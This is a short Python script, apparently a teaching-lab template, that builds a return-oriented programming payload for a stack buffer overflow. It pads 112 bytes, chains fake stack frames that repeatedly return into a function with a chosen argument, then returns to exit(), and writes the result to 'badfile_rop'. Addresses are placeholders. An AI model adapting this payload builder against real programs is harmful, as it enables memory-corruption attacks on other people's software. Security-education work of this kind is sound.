#!/usr/bin/python3
#rop_withargument.py

import sys

func_arg_skip_addr = 0xAAAAAAAA      # The address of code after func_arg() prologue
exit_addr = 0xBBBBBBBB               # The address of exit()
ebp_foo = 0xCCCCCCCC                 # The frame pointer of foo()
times = DD                           # Number of times func_arg() is entered

def tobytes (value):
    return (value).to_bytes(4,byteorder='little')

content = bytearray(0xaa for i in range(112))

ebp_next = ebp_foo
for i in range(times):
  ebp_next += 0x20                   # Distance between X and Y is 32
  content  += tobytes(ebp_next)      # Next ebp value     
  content  += tobytes(func_arg_skip_addr) # Return address     
  content  += tobytes(0xEEEEEEEE)    # The argument     
  content  += b'A' * (0x20 - 3*4)    # Fill up the frame

# Invoke exit() to exit the program
content += tobytes(0x11111111) # Next ebp value (never used)
content += tobytes(exit_addr) # Return address (exit)
content += tobytes(0xEEEEEEEE) # The argument

# Write the content to badfile
with open('badfile_rop', 'wb') as f:
    f.write(content)
